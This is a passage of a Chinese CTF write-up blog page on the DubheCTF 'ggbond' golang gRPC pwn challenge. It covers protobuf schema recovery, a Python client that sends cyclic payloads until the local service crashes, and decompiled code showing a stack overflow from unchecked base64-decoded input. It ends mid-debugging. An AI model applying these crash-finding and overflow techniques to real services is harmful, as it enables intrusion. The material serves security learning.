@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>DubheCTF-ggbond - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+golang pwn
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="DubheCTF-ggbond" />
+<meta property="og:description" content="
+golang pwn
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/dubhectf-ggbond/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-20T12:00:00+00:00" />
+<meta property="article:modified_time" content="2024-03-20T12:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="DubheCTF-ggbond"/>
+<meta name="twitter:description" content="
+golang pwn
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">DubheCTF-ggbond</h1>
+			<div class="meta">Posted on Mar 20, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>golang pwn</p>
+</blockquote>
+<h2 id="ggbond">ggbond</h2>
+<p>打开，golang protobuf grpc服务，但是程序保护开的少，加上go静态编译，保证gadget是够用的，并且符号表比较完整</p>
+<p>学习一下protobuf: <a href="https://zhuanlan.zhihu.com/p/436041011">深入解析protobuf</a></p>
+<p>每个消息必有类型和字段编号，也存在可选的字段</p>
+<ul>
+<li><strong>optional</strong>: message 可以包含该字段零次或一次（不超过一次）。</li>
+<li><strong>repeated</strong>: 该字段可以在消息中重复任意多次（包括零）。其中重复值的顺序会被保留。在开发语言中就是数组和列表</li>
+</ul>
+<p>每个字段有唯一编号，在二进制流中标识字段</p>
+<ul>
+<li>1 到 15 范围内的字段编号需要一个字节进行编码，编码结果将同时包含编号和类型</li>
+<li>16 到 2047 范围内的字段编号占用两个字节。因此，非常频繁出现的 message 元素保留字段编号 1 到 15。</li>
+<li>字段最小数字为1，最大字段数为2^29 - 1。</li>
+<li>19000 ~ 19999 保留</li>
+</ul>
+<p>grpcurl的结果：<a href="https://github.com/grpc/grpc-go/blob/master/Documentation/server-reflection-tutorial.md">server-reflection-tutorial</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+</span></span><span style="display:flex;"><span>$ grpcurl -plaintext 127.0.0.1:1337 list
+</span></span><span style="display:flex;"><span>Failed to list services: server does not support the reflection API
+</span></span></code></pre></div><p>和官方案例有点像，因此编译官方案例: <a href="https://grpc.io/docs/languages/go/quickstart/">Quick start | Go | gRPC</a></p>
+<p>下载源码 <code>go build</code> 然后IDA对比一下</p>
+<p><a href="https://scottgold.github.io/2020/11/16/%E9%98%85%E8%AF%BBprotobuf-go%E4%BB%A3%E7%A0%81.html">阅读protobuf Go代码</a>:可以找到一点 proto message 和 golang struct 的关系，开始处有三个字段，并且名称修改为大驼峰</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">type</span> OrderRequest <span style="color:#8be9fd;font-style:italic">struct</span> {
+</span></span><span style="display:flex;"><span>	state         protoimpl.MessageState
+</span></span><span style="display:flex;"><span>	sizeCache     protoimpl.SizeCache
+</span></span><span style="display:flex;"><span>	unknownFields protoimpl.UnknownFields
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// proto message
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
+</span></span></code></pre></div><p>因此ggbond存在5种request，以及其对应的response。</p>
+<p>通过官方helloworld寻找service</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>syntax = <span style="color:#f1fa8c">&#34;proto3&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>option go_package = <span style="color:#f1fa8c">&#34;google.golang.org/grpc/examples/helloworld/helloworld&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> helloworld;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>service Greeter {
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// Sends a greeting
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  rpc <span style="color:#50fa7b">SayHello</span> (HelloRequest) <span style="color:#50fa7b">returns</span> (HelloReply) {}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// main.(*server).SayHello
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>retval_840CC0 __golang main__ptr_server_SayHello
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// google.golang.org/grpc/examples/helloworld/helloworld._Greeter_SayHello_Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>RTYPE <span style="color:#ff79c6">*</span>__golang google_golang_org_grpc_examples_helloworld_helloworld__Greeter_SayHello_Handler
+</span></span></code></pre></div><p>同理</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#6272a4">// main/ggbond._GGBondServer_Handler_Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>RTYPE <span style="color:#ff79c6">*</span>__golang main_ggbond__GGBondServer_Handler_Handle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// main.(*server).Handler
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>retval_848680 __golang main__ptr_server_Handle
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>option go_package = <span style="color:#f1fa8c">&#34;ggbond&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ggbond;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>service GGBondServer {
+</span></span><span style="display:flex;"><span>  rpc <span style="color:#50fa7b">Handler</span>(Request) <span style="color:#50fa7b">returns</span> (Response) {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用Docker搭建环境，尝试一下交互</p>
+<p>首先生成py文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I. --python_out<span style="color:#ff79c6">=</span>. --grpc_python_out<span style="color:#ff79c6">=</span>. ggbond.proto
+</span></span></code></pre></div><p>通信报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">status</span> <span style="color:#ff79c6">=</span> StatusCode.UNIMPLEMENTED
+</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd;font-style:italic">details</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;unknown service ggbond.GGBondServer&#34;</span>
+</span></span></code></pre></div><p>找到正确的service名称</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>p_grpc_UnaryServerInfo<span style="color:#ff79c6">-</span>&gt;FullMethod.ptr = <span style="color:#f1fa8c">&#34;/GGBond.GGBondServer/Handler&#34;</span>;
+</span></span></code></pre></div><p>所以最终，大体是如下的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>syntax = <span style="color:#f1fa8c">&#34;proto3&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>option go_package = <span style="color:#f1fa8c">&#34;GGBond&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> GGBond;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>service GGBondServer {
+</span></span><span style="display:flex;"><span>  rpc <span style="color:#50fa7b">Handler</span>(Request) <span style="color:#50fa7b">returns</span> (Response) {}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message IsRequest {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> tab = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> data = <span style="color:#bd93f9">2</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message IsResponse {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> tab = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> data = <span style="color:#bd93f9">2</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message Request {
+</span></span><span style="display:flex;"><span>  IsRequest request = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message Response {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> tab = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">uint64</span> data = <span style="color:#bd93f9">2</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message WhoamiRequest {
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message WhoamiResponse {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">string</span> message = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message RoleChangeRequest {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint32</span> role = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message RoleChangeResponse {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">string</span> message = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message RepeaterRequest {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">string</span> message = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message RepeaterResponse {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">string</span> message = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message ErrorResponse {
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">string</span> message = <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后通信发现回显不对，一直卡住了。问题在于如何一个Request显示4种message?</p>
+<hr>
+<p>赛后看WP，只能说做题时重点错了，应该直接找相关工具的</p>
+<p>可以用pbtk还原protobuf结构：<a href="https://wzt.ac.cn/2023/12/14/protobuf/">逆向恢复 Protobuf 对象结构</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python pbtk/extractors/from_binary.py  ./pwn ./ggbond.proto 
+</span></span></code></pre></div><p>获得proto文件，可以看出使用 oneof 处理请求，并且编号不对😫</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-protobuf" data-lang="protobuf"><span style="display:flex;"><span>syntax <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;proto3&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">package</span> GGBond;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">option</span> go_package <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./;ggbond&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">service</span> GGBondServer {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">rpc</span> Handler(Request) <span style="color:#ff79c6">returns</span> (Response);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">Request</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">oneof</span> request {
+</span></span><span style="display:flex;"><span>        WhoamiRequest whoami <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">100</span>;
+</span></span><span style="display:flex;"><span>        RoleChangeRequest role_change <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">101</span>;
+</span></span><span style="display:flex;"><span>        RepeaterRequest repeater <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">102</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">Response</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">oneof</span> response {
+</span></span><span style="display:flex;"><span>        WhoamiResponse whoami <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">200</span>;
+</span></span><span style="display:flex;"><span>        RoleChangeResponse role_change <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">201</span>;
+</span></span><span style="display:flex;"><span>        RepeaterResponse repeater <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">202</span>;
+</span></span><span style="display:flex;"><span>        ErrorResponse error <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">444</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">WhoamiRequest</span> {
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">WhoamiResponse</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">string</span> <span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2000</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">RoleChangeRequest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint32</span> role <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1001</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">RoleChangeResponse</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">string</span> <span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2001</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">RepeaterRequest</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">string</span> <span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1002</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">RepeaterResponse</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">string</span> <span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2002</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#50fa7b">ErrorResponse</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">string</span> <span style="color:#8be9fd;font-style:italic">message</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">4444</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><blockquote>
+<p>根据字符串应该是在<code>.noptrdata:0000000000C22E62</code> 这一段区域，结合protobuf结构反序列化一下</p>
+</blockquote>
+<p>因此就可以进行<del>愉快的</del>尝试PWN了</p>
+<p>首先测试三个功能</p>
+<ul>
+<li>Whoami: 用户</li>
+<li>RoleChange: 改变用户,用户change不能超过3,否则切换失败</li>
+<li>Repeater: 用户后添加我们发送的内容</li>
+</ul>
+<p>因此也是很简单的功能,先尝试手测,然后就崩溃了.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> grpc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ggbond_pb2
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ggbond_pb2_grpc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel <span style="color:#ff79c6">=</span> grpc<span style="color:#ff79c6">.</span>insecure_channel(<span style="color:#f1fa8c">&#39;127.0.0.1:1337&#39;</span>)
+</span></span><span style="display:flex;"><span>stub <span style="color:#ff79c6">=</span> ggbond_pb2_grpc<span style="color:#ff79c6">.</span>GGBondServerStub(channel)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">whoami_request</span>():
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>WhoamiRequest()
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(whoami<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>whoami<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">role_change_request</span>(role: <span style="color:#8be9fd;font-style:italic">int</span>):
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>RoleChangeRequest()
+</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>role <span style="color:#ff79c6">=</span> role
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(role_change<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>role_change<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">repeater_request</span>(m):
+</span></span><span style="display:flex;"><span>    msg <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>RepeaterRequest()
+</span></span><span style="display:flex;"><span>    msg<span style="color:#ff79c6">.</span>message <span style="color:#ff79c6">=</span> m
+</span></span><span style="display:flex;"><span>    req <span style="color:#ff79c6">=</span> ggbond_pb2<span style="color:#ff79c6">.</span>Request(repeater<span style="color:#ff79c6">=</span>msg)
+</span></span><span style="display:flex;"><span>    resp <span style="color:#ff79c6">=</span> stub<span style="color:#ff79c6">.</span>Handler(req)
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Greeter client received: &#34;</span> <span style="color:#ff79c6">+</span> resp<span style="color:#ff79c6">.</span>repeater<span style="color:#ff79c6">.</span>message)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>role_change_request(<span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>whoami_request()
+</span></span><span style="display:flex;"><span>repeater_request(cyclic(<span style="color:#bd93f9">100</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>role_change_request(<span style="color:#bd93f9">2</span>)
+</span></span><span style="display:flex;"><span>whoami_request()
+</span></span><span style="display:flex;"><span>repeater_request(cyclic(<span style="color:#bd93f9">100</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>role_change_request(<span style="color:#bd93f9">3</span>)
+</span></span><span style="display:flex;"><span>whoami_request()
+</span></span><span style="display:flex;"><span>repeater_request(cyclic(<span style="color:#bd93f9">100</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>channel<span style="color:#ff79c6">.</span>close()
+</span></span></code></pre></div><p>第三次请求时保存,连接断开,因此从第三次尝试</p>
+<p>在 <code>repeater_request(cyclic(0x28))</code> 不崩溃,在0x30崩溃</p>
+<p>逆向一下repeater,结合测试的结果,还是能大致猜出来</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ( tab <span style="color:#ff79c6">==</span> off_9799C0 )   <span style="color:#6272a4">// request.tab = RepeaterRequest
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  {
+</span></span><span style="display:flex;"><span>    v99 = a3;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( qword_C94B80 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">3</span> )   <span style="color:#6272a4">// role=3 特殊处理
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 将传入的数据 base64 解码
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>v100 = <span style="color:#ff79c6">*</span>(<span style="color:#8be9fd">string</span> <span style="color:#ff79c6">*</span>)(<span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)v99<span style="color:#ff79c6">-</span>&gt;Request.data <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">40</span>LL);
+</span></span><span style="display:flex;"><span>len = v100.len;
+</span></span><span style="display:flex;"><span>v102 = <span style="color:#50fa7b">encoding_base64__ptr_Encoding_DecodeString</span>(qword_C62CA0, v100);
+</span></span><span style="display:flex;"><span>ptr = v102<span style="color:#bd93f9">.0</span>.ptr;
+</span></span><span style="display:flex;"><span>v92 = v102<span style="color:#bd93f9">.0</span>.len;
+</span></span><span style="display:flex;"><span>cap = v102<span style="color:#bd93f9">.0</span>.cap;
+</span></span><span style="display:flex;"><span>v76[<span style="color:#bd93f9">0</span>] = v8;  <span style="color:#6272a4">// 这是一个栈上的数据
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>v76[<span style="color:#bd93f9">1</span>] = v8;  
+</span></span><span style="display:flex;"><span>v94 = v76;
+</span></span><span style="display:flex;"><span>v95 = <span style="color:#bd93f9">32</span>LL;
+</span></span><span style="display:flex;"><span>v96 = <span style="color:#bd93f9">32</span>LL;
+</span></span><span style="display:flex;"><span>v50 = v76;
+</span></span><span style="display:flex;"><span>v51 = v102<span style="color:#bd93f9">.0</span>.ptr;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// go Unsafe 做指针加法
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">// 将解码后的数据传递给v50
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">for</span> ( i = <span style="color:#bd93f9">0</span>LL; i &lt; (__int64)(<span style="color:#bd93f9">3</span> <span style="color:#ff79c6">*</span> (len <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">2</span>)); <span style="color:#ff79c6">++</span>i )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(_BYTE <span style="color:#ff79c6">*</span>)v50 = <span style="color:#ff79c6">*</span>v51;
+</span></span><span style="display:flex;"><span>	v50 = (__int128 <span style="color:#ff79c6">*</span>)((char <span style="color:#ff79c6">*</span>)v50 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">++</span>v51;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>然后就是下断点,调试,获得si到bp的距离</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> RDI  0xc00002832c ◂— 0x333231 /* <span style="color:#f1fa8c">&#39;123&#39;</span> */
